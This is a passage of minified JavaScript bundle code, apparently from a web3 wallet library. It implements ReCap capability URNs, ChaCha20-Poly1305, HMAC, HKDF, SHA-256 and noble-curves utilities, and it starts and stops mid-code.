`)};function D_(t){return Buffer.from(JSON.stringify(t)).toString("base64")}function B_(t){return JSON.parse(Buffer.from(t,"base64").toString("utf-8"))}function bc(t){if(!t)throw new Error("No recap provided, value is undefined");if(!t.att)throw new Error("No `att` property found");const e=Object.keys(t.att);if(!(e!=null&&e.length))throw new Error("No resources found in `att` property");e.forEach(r=>{const n=t.att[r];if(Array.isArray(n))throw new Error(`Resource must be an object: ${r}`);if(typeof n!="object")throw new Error(`Resource must be an object: ${r}`);if(!Object.keys(n).length)throw new Error(`Resource object is empty: ${r}`);Object.keys(n).forEach(i=>{const s=n[i];if(!Array.isArray(s))throw new Error(`Ability limits ${i} must be an array of objects, found: ${s}`);if(!s.length)throw new Error(`Value of ${i} is empty array, must be an array with objects`);s.forEach(o=>{if(typeof o!="object")throw new Error(`Ability limits (${i}) must be an array of objects, found: ${o}`)})})})}function L_(t,e,r,n={}){return r==null||r.sort((i,s)=>i.localeCompare(s)),{att:{[t]:U_(e,r,n)}}}function U_(t,e,r={}){e=e==null?void 0:e.sort((i,s)=>i.localeCompare(s));const n=e.map(i=>({[`${t}/${i}`]:[r]}));return Object.assign({},...n)}function sC(t){return bc(t),`urn:recap:${D_(t).replace(/=/g,"")}`}function Dd(t){const e=B_(t.replace("urn:recap:",""));return bc(e),e}function M_(t,e,r){const n=L_(t,e,r);return sC(n)}function F_(t){return t&&t.includes("urn:recap:")}function z_(t,e){const r=Dd(t),n=Dd(e),i=j_(r,n);return sC(i)}function j_(t,e){bc(t),bc(e);const r=Object.keys(t.att).concat(Object.keys(e.att)).sort((i,s)=>i.localeCompare(s)),n={att:{}};return r.forEach(i=>{var s,o;Object.keys(((s=t.att)==null?void 0:s[i])||{}).concat(Object.keys(((o=e.att)==null?void 0:o[i])||{})).sort((a,c)=>a.localeCompare(c)).forEach(a=>{var c,l;n.att[i]=T_(__({},n.att[i]),{[a]:((c=t.att[i])==null?void 0:c[a])||((l=e.att[i])==null?void 0:l[a])})})}),n}function H_(t="",e){bc(e);const r="I further authorize the stated URI to perform the following actions on my behalf: ";if(t.includes(r))return t;const n=[];let i=0;Object.keys(e.att).forEach(a=>{const c=Object.keys(e.att[a]).map(h=>({ability:h.split("/")[0],action:h.split("/")[1]}));c.sort((h,d)=>h.action.localeCompare(d.action));const l={};c.forEach(h=>{l[h.ability]||(l[h.ability]=[]),l[h.ability].push(h.action)});const u=Object.keys(l).map(h=>(i++,`(${i}) '${h}': '${l[h].join("', '")}' for '${a}'.`));n.push(u.join(", ").replace(".,","."))});const s=n.join(" "),o=`${r}${s}`;return`${t?t+" ":""}${o}`}function d3(t){var e;const r=Dd(t);bc(r);const n=(e=r.att)==null?void 0:e.eip155;return n?Object.keys(n).map(i=>i.split("/")[1]):[]}function f3(t){const e=Dd(t);bc(e);const r=[];return Object.values(e.att).forEach(n=>{Object.values(n).forEach(i=>{var s;(s=i==null?void 0:i[0])!=null&&s.chains&&r.push(i[0].chains)})}),[...new Set(r.flat())]}function O0(t){if(!t)return;const e=t==null?void 0:t[t.length-1];return F_(e)?e:void 0}function Z1(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function oC(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function fn(t,...e){if(!oC(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function p3(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function q_(t,e){fn(t);const r=e.outputLen;if(t.length<r)throw new Error("digestInto() expects output buffer of length at least "+r)}function g3(t){if(typeof t!="boolean")throw new Error(`boolean expected, not ${t}`)}const Bo=t=>new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4)),V_=t=>new DataView(t.buffer,t.byteOffset,t.byteLength),W_=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;if(!W_)throw new Error("Non little-endian hardware is not supported");function G_(t){if(typeof t!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(t))}function Ym(t){if(typeof t=="string")t=G_(t);else if(oC(t))t=Xm(t);else throw new Error("Uint8Array expected, got "+typeof t);return t}function K_(t,e){if(e==null||typeof e!="object")throw new Error("options must be defined");return Object.assign(t,e)}function Z_(t,e){if(t.length!==e.length)return!1;let r=0;for(let n=0;n<t.length;n++)r|=t[n]^e[n];return r===0}const J_=(t,e)=>{function r(n,...i){if(fn(n),t.nonceLength!==void 0){const l=i[0];if(!l)throw new Error("nonce / iv required");t.varSizeNonce?fn(l):fn(l,t.nonceLength)}const s=t.tagLength;s&&i[1]!==void 0&&fn(i[1]);const o=e(n,...i),a=(l,u)=>{if(u!==void 0){if(l!==2)throw new Error("cipher output not supported");fn(u)}};let c=!1;return{encrypt(l,u){if(c)throw new Error("cannot encrypt() twice with same key + nonce");return c=!0,fn(l),a(o.encrypt.length,u),o.encrypt(l,u)},decrypt(l,u){if(fn(l),s&&l.length<s)throw new Error("invalid ciphertext length: smaller than tagLength="+s);return a(o.decrypt.length,u),o.decrypt(l,u)}}}return Object.assign(r,t),r};function w3(t,e,r=!0){if(e===void 0)return new Uint8Array(t);if(e.length!==t)throw new Error("invalid output length, expected "+t+", got: "+e.length);if(r&&!Q_(e))throw new Error("invalid output, must be aligned");return e}function m3(t,e,r,n){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,r,n);const i=BigInt(32),s=BigInt(4294967295),o=Number(r>>i&s),a=Number(r&s);t.setUint32(e+4,o,n),t.setUint32(e+0,a,n)}function Q_(t){return t.byteOffset%4===0}function Xm(t){return Uint8Array.from(t)}function Lu(...t){for(let e=0;e<t.length;e++)t[e].fill(0)}const aC=t=>Uint8Array.from(t.split("").map(e=>e.charCodeAt(0))),Y_=aC("expand 16-byte k"),X_=aC("expand 32-byte k"),eT=Bo(Y_),tT=Bo(X_);function We(t,e){return t<<e|t>>>32-e}function ey(t){return t.byteOffset%4===0}const yp=64,rT=16,cC=2**32-1,y3=new Uint32Array;function nT(t,e,r,n,i,s,o,a){const c=i.length,l=new Uint8Array(yp),u=Bo(l),h=ey(i)&&ey(s),d=h?Bo(i):y3,f=h?Bo(s):y3;for(let g=0;g<c;o++){if(t(e,r,n,u,o,a),o>=cC)throw new Error("arx: counter overflow");const p=Math.min(yp,c-g);if(h&&p===yp){const w=g/4;if(g%4!==0)throw new Error("arx: invalid block position");for(let m=0,b;m<rT;m++)b=w+m,f[b]=d[b]^u[m];g+=yp;continue}for(let w=0,m;w<p;w++)m=g+w,s[m]=i[m]^l[w];g+=p}}function iT(t,e){const{allowShortKeys:r,extendNonceFn:n,counterLength:i,counterRight:s,rounds:o}=K_({allowShortKeys:!1,counterLength:8,counterRight:!1,rounds:20},e);if(typeof t!="function")throw new Error("core must be a function");return Z1(i),Z1(o),g3(s),g3(r),(a,c,l,u,h=0)=>{fn(a),fn(c),fn(l);const d=l.length;if(u===void 0&&(u=new Uint8Array(d)),fn(u),Z1(h),h<0||h>=cC)throw new Error("arx: counter overflow");if(u.length<d)throw new Error(`arx: output (${u.length}) is shorter than data (${d})`);const f=[];let g=a.length,p,w;if(g===32)f.push(p=Xm(a)),w=tT;else if(g===16&&r)p=new Uint8Array(32),p.set(a),p.set(a,16),w=eT,f.push(p);else throw new Error(`arx: invalid 32-byte key, got length=${g}`);ey(c)||f.push(c=Xm(c));const m=Bo(p);if(n){if(c.length!==24)throw new Error("arx: extended nonce must be 24 bytes");n(w,m,Bo(c.subarray(0,16)),m),c=c.subarray(16)}const b=16-i;if(b!==c.length)throw new Error(`arx: nonce must be ${b} or 16 bytes`);if(b!==12){const x=new Uint8Array(12);x.set(c,s?0:12-c.length),c=x,f.push(c)}const v=Bo(c);return nT(t,w,m,v,l,u,h,o),Lu(...f),u}}const Xt=(t,e)=>t[e++]&255|(t[e++]&255)<<8;let sT=class{constructor(e){this.blockLen=16,this.outputLen=16,this.buffer=new Uint8Array(16),this.r=new Uint16Array(10),this.h=new Uint16Array(10),this.pad=new Uint16Array(8),this.pos=0,this.finished=!1,e=Ym(e),fn(e,32);const r=Xt(e,0),n=Xt(e,2),i=Xt(e,4),s=Xt(e,6),o=Xt(e,8),a=Xt(e,10),c=Xt(e,12),l=Xt(e,14);this.r[0]=r&8191,this.r[1]=(r>>>13|n<<3)&8191,this.r[2]=(n>>>10|i<<6)&7939,this.r[3]=(i>>>7|s<<9)&8191,this.r[4]=(s>>>4|o<<12)&255,this.r[5]=o>>>1&8190,this.r[6]=(o>>>14|a<<2)&8191,this.r[7]=(a>>>11|c<<5)&8065,this.r[8]=(c>>>8|l<<8)&8191,this.r[9]=l>>>5&127;for(let u=0;u<8;u++)this.pad[u]=Xt(e,16+2*u)}process(e,r,n=!1){const i=n?0:2048,{h:s,r:o}=this,a=o[0],c=o[1],l=o[2],u=o[3],h=o[4],d=o[5],f=o[6],g=o[7],p=o[8],w=o[9],m=Xt(e,r+0),b=Xt(e,r+2),v=Xt(e,r+4),x=Xt(e,r+6),I=Xt(e,r+8),C=Xt(e,r+10),N=Xt(e,r+12),S=Xt(e,r+14);let P=s[0]+(m&8191),T=s[1]+((m>>>13|b<<3)&8191),D=s[2]+((b>>>10|v<<6)&8191),z=s[3]+((v>>>7|x<<9)&8191),V=s[4]+((x>>>4|I<<12)&8191),O=s[5]+(I>>>1&8191),y=s[6]+((I>>>14|C<<2)&8191),E=s[7]+((C>>>11|N<<5)&8191),k=s[8]+((N>>>8|S<<8)&8191),_=s[9]+(S>>>5|i),R=0,L=R+P*a+T*(5*w)+D*(5*p)+z*(5*g)+V*(5*f);R=L>>>13,L&=8191,L+=O*(5*d)+y*(5*h)+E*(5*u)+k*(5*l)+_*(5*c),R+=L>>>13,L&=8191;let q=R+P*c+T*a+D*(5*w)+z*(5*p)+V*(5*g);R=q>>>13,q&=8191,q+=O*(5*f)+y*(5*d)+E*(5*h)+k*(5*u)+_*(5*l),R+=q>>>13,q&=8191;let W=R+P*l+T*c+D*a+z*(5*w)+V*(5*p);R=W>>>13,W&=8191,W+=O*(5*g)+y*(5*f)+E*(5*d)+k*(5*h)+_*(5*u),R+=W>>>13,W&=8191;let Z=R+P*u+T*l+D*c+z*a+V*(5*w);R=Z>>>13,Z&=8191,Z+=O*(5*p)+y*(5*g)+E*(5*f)+k*(5*d)+_*(5*h),R+=Z>>>13,Z&=8191;let G=R+P*h+T*u+D*l+z*c+V*a;R=G>>>13,G&=8191,G+=O*(5*w)+y*(5*p)+E*(5*g)+k*(5*f)+_*(5*d),R+=G>>>13,G&=8191;let ne=R+P*d+T*h+D*u+z*l+V*c;R=ne>>>13,ne&=8191,ne+=O*a+y*(5*w)+E*(5*p)+k*(5*g)+_*(5*f),R+=ne>>>13,ne&=8191;let de=R+P*f+T*d+D*h+z*u+V*l;R=de>>>13,de&=8191,de+=O*c+y*a+E*(5*w)+k*(5*p)+_*(5*g),R+=de>>>13,de&=8191;let Se=R+P*g+T*f+D*d+z*h+V*u;R=Se>>>13,Se&=8191,Se+=O*l+y*c+E*a+k*(5*w)+_*(5*p),R+=Se>>>13,Se&=8191;let Ne=R+P*p+T*g+D*f+z*d+V*h;R=Ne>>>13,Ne&=8191,Ne+=O*u+y*l+E*c+k*a+_*(5*w),R+=Ne>>>13,Ne&=8191;let be=R+P*w+T*p+D*g+z*f+V*d;R=be>>>13,be&=8191,be+=O*h+y*u+E*l+k*c+_*a,R+=be>>>13,be&=8191,R=(R<<2)+R|0,R=R+L|0,L=R&8191,R=R>>>13,q+=R,s[0]=L,s[1]=q,s[2]=W,s[3]=Z,s[4]=G,s[5]=ne,s[6]=de,s[7]=Se,s[8]=Ne,s[9]=be}finalize(){const{h:e,pad:r}=this,n=new Uint16Array(10);let i=e[1]>>>13;e[1]&=8191;for(let a=2;a<10;a++)e[a]+=i,i=e[a]>>>13,e[a]&=8191;e[0]+=i*5,i=e[0]>>>13,e[0]&=8191,e[1]+=i,i=e[1]>>>13,e[1]&=8191,e[2]+=i,n[0]=e[0]+5,i=n[0]>>>13,n[0]&=8191;for(let a=1;a<10;a++)n[a]=e[a]+i,i=n[a]>>>13,n[a]&=8191;n[9]-=8192;let s=(i^1)-1;for(let a=0;a<10;a++)n[a]&=s;s=~s;for(let a=0;a<10;a++)e[a]=e[a]&s|n[a];e[0]=(e[0]|e[1]<<13)&65535,e[1]=(e[1]>>>3|e[2]<<10)&65535,e[2]=(e[2]>>>6|e[3]<<7)&65535,e[3]=(e[3]>>>9|e[4]<<4)&65535,e[4]=(e[4]>>>12|e[5]<<1|e[6]<<14)&65535,e[5]=(e[6]>>>2|e[7]<<11)&65535,e[6]=(e[7]>>>5|e[8]<<8)&65535,e[7]=(e[8]>>>8|e[9]<<5)&65535;let o=e[0]+r[0];e[0]=o&65535;for(let a=1;a<8;a++)o=(e[a]+r[a]|0)+(o>>>16)|0,e[a]=o&65535;Lu(n)}update(e){p3(this);const{buffer:r,blockLen:n}=this;e=Ym(e);const i=e.length;for(let s=0;s<i;){const o=Math.min(n-this.pos,i-s);if(o===n){for(;n<=i-s;s+=n)this.process(e,s);continue}r.set(e.subarray(s,s+o),this.pos),this.pos+=o,s+=o,this.pos===n&&(this.process(r,0,!1),this.pos=0)}return this}destroy(){Lu(this.h,this.r,this.buffer,this.pad)}digestInto(e){p3(this),q_(e,this),this.finished=!0;const{buffer:r,h:n}=this;let{pos:i}=this;if(i){for(r[i++]=1;i<16;i++)r[i]=0;this.process(r,0,!0)}this.finalize();let s=0;for(let o=0;o<8;o++)e[s++]=n[o]>>>0,e[s++]=n[o]>>>8;return e}digest(){const{buffer:e,outputLen:r}=this;this.digestInto(e);const n=e.slice(0,r);return this.destroy(),n}};function oT(t){const e=(n,i)=>t(i).update(Ym(n)).digest(),r=t(new Uint8Array(32));return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=n=>t(n),e}const aT=oT(t=>new sT(t));function cT(t,e,r,n,i,s=20){let o=t[0],a=t[1],c=t[2],l=t[3],u=e[0],h=e[1],d=e[2],f=e[3],g=e[4],p=e[5],w=e[6],m=e[7],b=i,v=r[0],x=r[1],I=r[2],C=o,N=a,S=c,P=l,T=u,D=h,z=d,V=f,O=g,y=p,E=w,k=m,_=b,R=v,L=x,q=I;for(let Z=0;Z<s;Z+=2)C=C+T|0,_=We(_^C,16),O=O+_|0,T=We(T^O,12),C=C+T|0,_=We(_^C,8),O=O+_|0,T=We(T^O,7),N=N+D|0,R=We(R^N,16),y=y+R|0,D=We(D^y,12),N=N+D|0,R=We(R^N,8),y=y+R|0,D=We(D^y,7),S=S+z|0,L=We(L^S,16),E=E+L|0,z=We(z^E,12),S=S+z|0,L=We(L^S,8),E=E+L|0,z=We(z^E,7),P=P+V|0,q=We(q^P,16),k=k+q|0,V=We(V^k,12),P=P+V|0,q=We(q^P,8),k=k+q|0,V=We(V^k,7),C=C+D|0,q=We(q^C,16),E=E+q|0,D=We(D^E,12),C=C+D|0,q=We(q^C,8),E=E+q|0,D=We(D^E,7),N=N+z|0,_=We(_^N,16),k=k+_|0,z=We(z^k,12),N=N+z|0,_=We(_^N,8),k=k+_|0,z=We(z^k,7),S=S+V|0,R=We(R^S,16),O=O+R|0,V=We(V^O,12),S=S+V|0,R=We(R^S,8),O=O+R|0,V=We(V^O,7),P=P+T|0,L=We(L^P,16),y=y+L|0,T=We(T^y,12),P=P+T|0,L=We(L^P,8),y=y+L|0,T=We(T^y,7);let W=0;n[W++]=o+C|0,n[W++]=a+N|0,n[W++]=c+S|0,n[W++]=l+P|0,n[W++]=u+T|0,n[W++]=h+D|0,n[W++]=d+z|0,n[W++]=f+V|0,n[W++]=g+O|0,n[W++]=p+y|0,n[W++]=w+E|0,n[W++]=m+k|0,n[W++]=b+_|0,n[W++]=v+R|0,n[W++]=x+L|0,n[W++]=I+q|0}const lT=iT(cT,{counterRight:!1,counterLength:4,allowShortKeys:!1}),uT=new Uint8Array(16),b3=(t,e)=>{t.update(e);const r=e.length%16;r&&t.update(uT.subarray(r))},hT=new Uint8Array(32);function v3(t,e,r,n,i){const s=t(e,r,hT),o=aT.create(s);i&&b3(o,i),b3(o,n);const a=new Uint8Array(16),c=V_(a);m3(c,0,BigInt(i?i.length:0),!0),m3(c,8,BigInt(n.length),!0),o.update(a);const l=o.digest();return Lu(s,a),l}const dT=t=>(e,r,n)=>({encrypt(i,s){const o=i.length;s=w3(o+16,s,!1),s.set(i);const a=s.subarray(0,-16);t(e,r,a,a,1);const c=v3(t,e,r,a,n);return s.set(c,o),Lu(c),s},decrypt(i,s){s=w3(i.length-16,s,!1);const o=i.subarray(0,-16),a=i.subarray(-16),c=v3(t,e,r,o,n);if(!Z_(a,c))throw new Error("invalid tag");return s.set(i.subarray(0,-16)),t(e,r,s,s,1),Lu(c),s}}),lC=J_({blockSize:64,nonceLength:12,tagLength:16},dT(lT));let uC=class extends jb{constructor(e,r){super(),this.finished=!1,this.destroyed=!1,zb(e);const n=Bu(r);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const i=this.blockLen,s=new Uint8Array(i);s.set(n.length>i?e.create().update(n).digest():n);for(let o=0;o<s.length;o++)s[o]^=54;this.iHash.update(s),this.oHash=e.create();for(let o=0;o<s.length;o++)s[o]^=106;this.oHash.update(s),s.fill(0)}update(e){return Du(this),this.iHash.update(e),this}digestInto(e){Du(this),jf(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:r,iHash:n,finished:i,destroyed:s,blockLen:o,outputLen:a}=this;return e=e,e.finished=i,e.destroyed=s,e.blockLen=o,e.outputLen=a,e.oHash=r._cloneInto(e.oHash),e.iHash=n._cloneInto(e.iHash),e}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}};const qg=(t,e,r)=>new uC(t,e).update(r).digest();qg.create=(t,e)=>new uC(t,e);function fT(t,e,r){return zb(t),r===void 0&&(r=new Uint8Array(t.outputLen)),qg(t,Bu(r),Bu(e))}const J1=new Uint8Array([0]),E3=new Uint8Array;function pT(t,e,r,n=32){if(zb(t),Rd(n),n>255*t.outputLen)throw new Error("Length should be <= 255*HashLen");const i=Math.ceil(n/t.outputLen);r===void 0&&(r=E3);const s=new Uint8Array(i*t.outputLen),o=qg.create(t,e),a=o._cloneInto(),c=new Uint8Array(o.outputLen);for(let l=0;l<i;l++)J1[0]=l+1,a.update(l===0?E3:c).update(r).update(J1).digestInto(c),s.set(c,t.outputLen*l),o._cloneInto(a);return o.destroy(),a.destroy(),c.fill(0),J1.fill(0),s.slice(0,n)}const gT=(t,e,r,n,i)=>pT(t,fT(t,e,r),n,i);function wT(t,e,r,n){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,r,n);const i=BigInt(32),s=BigInt(4294967295),o=Number(r>>i&s),a=Number(r&s),c=n?4:0,l=n?0:4;t.setUint32(e+c,o,n),t.setUint32(e+l,a,n)}function mT(t,e,r){return t&e^~t&r}function yT(t,e,r){return t&e^t&r^e&r}let bT=class extends jb{constructor(e,r,n,i){super(),this.blockLen=e,this.outputLen=r,this.padOffset=n,this.isLE=i,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=K1(this.buffer)}update(e){Du(this);const{view:r,buffer:n,blockLen:i}=this;e=Bu(e);const s=e.length;for(let o=0;o<s;){const a=Math.min(i-this.pos,s-o);if(a===i){const c=K1(e);for(;i<=s-o;o+=i)this.process(c,o);continue}n.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===i&&(this.process(r,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){Du(this),QE(e,this),this.finished=!0;const{buffer:r,view:n,blockLen:i,isLE:s}=this;let{pos:o}=this;r[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>i-o&&(this.process(n,0),o=0);for(let h=o;h<i;h++)r[h]=0;wT(n,i-8,BigInt(this.length*8),s),this.process(n,0);const a=K1(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const l=c/4,u=this.get();if(l>u.length)throw new Error("_sha2: outputLen bigger than state");for(let h=0;h<l;h++)a.setUint32(4*h,u[h],s)}digest(){const{buffer:e,outputLen:r}=this;this.digestInto(e);const n=e.slice(0,r);return this.destroy(),n}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:r,buffer:n,length:i,finished:s,destroyed:o,pos:a}=this;return e.length=i,e.pos=a,e.finished=s,e.destroyed=o,i%r&&e.buffer.set(n),e}};const vT=new Uint32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),Ks=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),Zs=new Uint32Array(64);let ET=class extends bT{constructor(){super(64,32,8,!1),this.A=Ks[0]|0,this.B=Ks[1]|0,this.C=Ks[2]|0,this.D=Ks[3]|0,this.E=Ks[4]|0,this.F=Ks[5]|0,this.G=Ks[6]|0,this.H=Ks[7]|0}get(){const{A:e,B:r,C:n,D:i,E:s,F:o,G:a,H:c}=this;return[e,r,n,i,s,o,a,c]}set(e,r,n,i,s,o,a,c){this.A=e|0,this.B=r|0,this.C=n|0,this.D=i|0,this.E=s|0,this.F=o|0,this.G=a|0,this.H=c|0}process(e,r){for(let h=0;h<16;h++,r+=4)Zs[h]=e.getUint32(r,!1);for(let h=16;h<64;h++){const d=Zs[h-15],f=Zs[h-2],g=yi(d,7)^yi(d,18)^d>>>3,p=yi(f,17)^yi(f,19)^f>>>10;Zs[h]=p+Zs[h-7]+g+Zs[h-16]|0}let{A:n,B:i,C:s,D:o,E:a,F:c,G:l,H:u}=this;for(let h=0;h<64;h++){const d=yi(a,6)^yi(a,11)^yi(a,25),f=u+d+mT(a,c,l)+vT[h]+Zs[h]|0,g=(yi(n,2)^yi(n,13)^yi(n,22))+yT(n,i,s)|0;u=l,l=c,c=a,a=o+f|0,o=s,s=i,i=n,n=f+g|0}n=n+this.A|0,i=i+this.B|0,s=s+this.C|0,o=o+this.D|0,a=a+this.E|0,c=c+this.F|0,l=l+this.G|0,u=u+this.H|0,this.set(n,i,s,o,a,c,l,u)}roundClean(){Zs.fill(0)}destroy(){this.set(0,0,0,0,0,0,0,0),this.buffer.fill(0)}};const Hf=YE(()=>new ET);/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Vg=BigInt(0),Wg=BigInt(1),CT=BigInt(2);function vc(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function qf(t){if(!vc(t))throw new Error("Uint8Array expected")}function Uu(t,e){if(typeof e!="boolean")throw new Error(t+" boolean expected, got "+e)}const AT=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function Mu(t){qf(t);let e="";for(let r=0;r<t.length;r++)e+=AT[t[r]];return e}function Rl(t){const e=t.toString(16);return e.length&1?"0"+e:e}function qb(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);return t===""?Vg:BigInt("0x"+t)}const Yi={_0:48,_9:57,A:65,F:70,a:97,f:102};function C3(t){if(t>=Yi._0&&t<=Yi._9)return t-Yi._0;if(t>=Yi.A&&t<=Yi.F)return t-(Yi.A-10);if(t>=Yi.a&&t<=Yi.f)return t-(Yi.a-10)}function Fu(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);const e=t.length,r=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const n=new Uint8Array(r);for(let i=0,s=0;i<r;i++,s+=2){const o=C3(t.charCodeAt(s)),a=C3(t.charCodeAt(s+1));if(o===void 0||a===void 0){const c=t[s]+t[s+1];throw new Error('hex string expected, got non-hex character "'+c+'" at index '+s)}n[i]=o*16+a}return n}function oc(t){return qb(Mu(t))}function Bd(t){return qf(t),qb(Mu(Uint8Array.from(t).reverse()))}function zu(t,e){return Fu(t.toString(16).padStart(e*2,"0"))}function Gg(t,e){return zu(t,e).reverse()}function xT(t){return Fu(Rl(t))}function dn(t,e,r){let n;if(typeof e=="string")try{n=Fu(e)}catch(s){throw new Error(t+" must be hex string or Uint8Array, cause: "+s)}else if(vc(e))n=Uint8Array.from(e);else throw new Error(t+" must be hex string or Uint8Array");const i=n.length;if(typeof r=="number"&&i!==r)throw new Error(t+" of length "+r+" expected, got "+i);return n}function Ld(...t){let e=0;for(let n=0;n<t.length;n++){const i=t[n];qf(i),e+=i.length}const r=new Uint8Array(e);for(let n=0,i=0;n<t.length;n++){const s=t[n];r.set(s,i),i+=s.length}return r}function IT(t,e){if(t.length!==e.length)return!1;let r=0;for(let n=0;n<t.length;n++)r|=t[n]^e[n];return r===0}function ST(t){if(typeof t!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(t))}const Q1=t=>typeof t=="bigint"&&Vg<=t;function Kg(t,e,r){return Q1(t)&&Q1(e)&&Q1(r)&&e<=t&&t<r}function Bs(t,e,r,n){if(!Kg(e,r,n))throw new Error("expected valid "+t+": "+r+" <= n < "+n+", got "+e)}function hC(t){let e;for(e=0;t>Vg;t>>=Wg,e+=1);return e}function NT(t,e){return t>>BigInt(e)&Wg}function PT(t,e,r){return t|(r?Wg:Vg)<<BigInt(e)}const Vb=t=>(CT<<BigInt(t-1))-Wg,Y1=t=>new Uint8Array(t),A3=t=>Uint8Array.from(t);function dC(t,e,r){if(typeof t!="number"||t<2)throw new Error("hashLen must be a number");if(typeof e!="number"||e<2)throw new Error("qByteLen must be a number");if(typeof r!="function")throw new Error("hmacFn must be a function");let n=Y1(t),i=Y1(t),s=0;const o=()=>{n.fill(1),i.fill(0),s=0},a=(...u)=>r(i,n,...u),c=(u=Y1())=>{i=a(A3([0]),u),n=a(),u.length!==0&&(i=a(A3([1]),u),n=a())},l=()=>{if(s++>=1e3)throw new Error("drbg: tried 1000 values");let u=0;const h=[];for(;u<e;){n=a();const d=n.slice();h.push(d),u+=n.length}return Ld(...h)};return(u,h)=>{o(),c(u);let d;for(;!(d=h(l()));)c();return o(),d}}const kT={bigint:t=>typeof t=="bigint",function:t=>typeof t=="function",boolean:t=>typeof t=="boolean",string:t=>typeof t=="string",stringOrUint8Array:t=>typeof t=="string"||vc(t),isSafeInteger:t=>Number.isSafeInteger(t),array:t=>Array.isArray(t),field:(t,e)=>e.Fp.isValid(t),hash:t=>typeof t=="function"&&Number.isSafeInteger(t.outputLen)};function uh(t,e,r={}){const n=(i,s,o)=>{const a=kT[s];if(typeof a!="function")throw new Error("invalid validator function");const c=t[i];if(!(o&&c===void 0)&&!a(c,t))throw new Error("param "+String(i)+" is invalid. Expected "+s+", got "+c)};for(const[i,s]of Object.entries(e))n(i,s,!1);for(const[i,s]of Object.entries(r))n(i,s,!0);return t}const OT=()=>{throw new Error("not implemented")};function ty(t){const e=new WeakMap;return(r,...n)=>{const i=e.get(r);if(i!==void 0)return i;const s=t(r,...n);return e.set(r,s),s}}var _T=Object.freeze({__proto__:null,isBytes:vc,abytes:qf,abool:Uu,bytesToHex:Mu,numberToHexUnpadded:Rl,hexToNumber:qb,hexToBytes:Fu,bytesToNumberBE:oc,bytesToNumberLE:Bd,numberToBytesBE:zu,numberToBytesLE:Gg,numberToVarBytesBE:xT,ensureBytes:dn,concatBytes:Ld,equalBytes:IT,utf8ToBytes:ST,inRange:Kg,aInRange:Bs,bitLen:hC,bitGet:NT,bitSet:PT,bitMask:Vb,createHmacDrbg:dC,validateObject:uh,notImplemented:OT,memoized:ty});const Jt=BigInt(0),It=BigInt(1),Aa=BigInt(2),TT=BigInt(3),ry=BigInt(4),x3=BigInt(5),I3=BigInt(8);function Hr(t,e){const r=t%e;return r>=Jt?r:e+r}function fC(t,e,r){if(e<Jt)throw new Error("invalid exponent, negatives unsupported");if(r<=Jt)throw new Error("invalid modulus");if(r===It)return Jt;let n=It;for(;e>Jt;)e&It&&(n=n*t%r),t=t*t%r,e>>=It;return n}function Xn(t,e,r){let n=t;for(;e-- >Jt;)n*=n,n%=r;return n}function ny(t,e){if(t===Jt)throw new Error("invert: expected non-zero number");if(e<=Jt)throw new Error("invert: expected positive modulus, got "+e);let r=Hr(t,e),n=e,i=Jt,s=It;for(;r!==Jt;){const o=n/r,a=n%r,c=i-s*o;n=r,r=a,i=s,s=c}if(n!==It)throw new Error("invert: does not exist");return Hr(i,e)}function $T(t){const e=(t-It)/Aa;let r,n,i;for(r=t-It,n=0;r%Aa===Jt;r/=Aa,n++);for(i=Aa;i<t&&fC(i,e,t)!==t-It;i++)if(i>1e3)throw new Error("Cannot find square root: likely non-prime P");if(n===1){const o=(t+It)/ry;return function(a,c){const l=a.pow(c,o);if(!a.eql(a.sqr(l),c))throw new Error("Cannot find square root");return l}}const s=(r+It)/Aa;return function(o,a){if(o.pow(a,e)===o.neg(o.ONE))throw new Error("Cannot find square root");let 